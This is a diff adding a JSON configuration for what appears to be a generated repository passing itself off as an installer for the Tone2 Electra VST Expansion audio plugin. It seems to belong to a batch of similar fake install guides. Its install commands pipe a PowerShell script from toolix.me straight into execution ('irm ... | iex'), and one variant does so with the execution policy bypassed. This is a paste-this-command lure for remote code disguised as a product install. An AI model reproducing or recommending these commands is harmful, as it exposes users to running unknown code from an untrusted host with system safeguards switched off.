@@ -1,0 +1,27 @@
+{
+  "repo": "Tone2-Electra-VST-Expansion-Setup",
+  "product": "Tone2 Electra VST Expansion Setup",
+  "product_title": "Tone2 Electra VST Expansion",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "audio",
+  "topics": [
+    "how-to-install-tone2-electra-vst-expansion",
+    "tone2-electra-vst-expansion-app",
+    "mixing-tools",
+    "audio-editing",
+    "music-production",
+    "daw-plugin",
+    "tone2-electra-vst-expansion-audio-tool",
+    "tone2-electra-vst-expansion-music-production",
+    "tone2-electra-vst-expansion",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
